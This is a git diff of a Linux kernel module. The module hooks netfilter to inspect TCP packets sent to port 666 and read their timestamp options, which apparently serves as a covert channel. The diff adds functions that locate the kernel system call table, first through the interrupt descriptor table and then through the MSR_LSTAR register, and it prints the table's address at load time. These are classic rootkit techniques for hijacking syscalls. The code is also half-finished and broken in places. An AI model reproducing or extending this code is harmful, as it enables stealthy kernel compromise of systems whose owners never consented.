@@ -329,7 +329,8 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
 
         printk(KERN_INFO "Packet length %lu\n", packet_len);
 
-        if (ntohs(tcp_header->dest) == 666 && !tcp_header->syn && tcp_header->psh && packet_len > 0) {
+        if (ntohs(tcp_header->dest) == 666 && !tcp_header->syn && tcp_header->psh
+                && packet_len > 0) {
             if (tcp_header->doff > 5) {
                 //Move to the start of the tcp options
                 timestamps = skb->data + (ip_header->ihl * 4) + 20;
@@ -455,8 +456,104 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     return NF_ACCEPT;
 }
 
+struct {
+    unsigned short limit;
+    unsigned long base;
+} __attribute__((packed)) idtr;
+
+struct {
+    unsigned short off1;
+    unsigned short sel;
+    unsigned char none, flags;
+    unsigned short off2;
+} __attribute__((packed)) idt;
+
+#if 0
+void* memmem(const void* haystack, size_t haystacklen, const void* needle, size_t needlelen) {
+    const unsigned char* hay = haystack;
+    const unsigned char* need = needle;
+    int i;
+    int j;
+
+    if (needlelen > haystacklen) {
+        return NULL;
+    }
+    for (i = 0; i < haystacklen - needlelen; ++i) {
+        for (j = 0; j < needlelen; ++j) {
+            printk(KERN_INFO "Checking char %02x against %02x\n", hay[i + j], need[j]);
+            if (hay[i + j] != need[j]) {
+                break;
+            }
+        }
+        if (j >= needlelen) {
+            //It was found
+            return haystack + i;
+        }
+    }
+    return NULL;
+}
+
+unsigned long* find_sys_call_table(void) {
+    char** p;
+    unsigned long sct_off = 0;
+    unsigned char code[255];
+
+    asm("sidt %0" : "=m"(idtr));
+    memcpy(&idt, (void*) (idtr.base + 8 * 0x80), sizeof(idt));
+    sct_off = (idt.off2 << 16) | idt.off1;
+    memcpy(code, (void*) sct_off, sizeof(code));
+
+    p = (char**) memmem(code, sizeof(code), "\xff\x14\x85", 3);
+
+    if (p) {
+        return *(unsigned long**) ((char*) p + 3);
+    } else {
+        return NULL;
+    }
+}
+#endif
+
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
+    	char *p;
+
+    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
+            printk(KERN_INFO "sct offset pointer %p\n", (void*) p);
+        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
+    	}
+    	return NULL;
+}
+
+unsigned long* find_sys_call_table(void) {
+    unsigned long sct_off = 0;
+    unsigned char code[512];
+    char** p;
+
+    rdmsrl(MSR_LSTAR, sct_off);
+    //rdmsrl(MSR_STAR, sct_off);
+    //rdmsrl(MSR_CSTAR, sct_off);
+    //rdmsrl(MSR_IA32_SYSENTER_CS, sct_off);
+    //rdmsrl(MSR_IA32_SYSENTER_ESP, sct_off);
+    //rdmsrl(MSR_IA32_SYSENTER_EIP, sct_off);
+    memcpy(code, (void*) sct_off, sizeof(code));
+
+    printk(KERN_INFO "sct offset %p\n", (void*) sct_off);
+
+    //p = (char**) memmem(code, sizeof(code), "\xff\x14\xc5", 3);
+    p = (char **) sct_off;
+
+    if (p) {
+        unsigned long* table = *(unsigned long**) ((char*) p + 3);
+        table = (unsigned long*) (((unsigned long) table & 0xffffffff) | 0xffffffff00000000);
+        return table;
+    }
+    return NULL;
+}
+
 static int __init mod_init(void) {
     int err;
+
+    printk(KERN_INFO "Kernel syscall table address %p\n", (void*) find_sys_call_table());
+    return 0;
 
     memset(&seq_history, 0, sizeof(struct seqack) * 10);
 
@@ -502,6 +599,7 @@ static int __init mod_init(void) {
 }
 
 static void __exit mod_exit(void) {
+    return;
     nf_unregister_net_hook(&init_net, &nfho);
     nf_unregister_net_hook(&init_net, &nfhi);
 
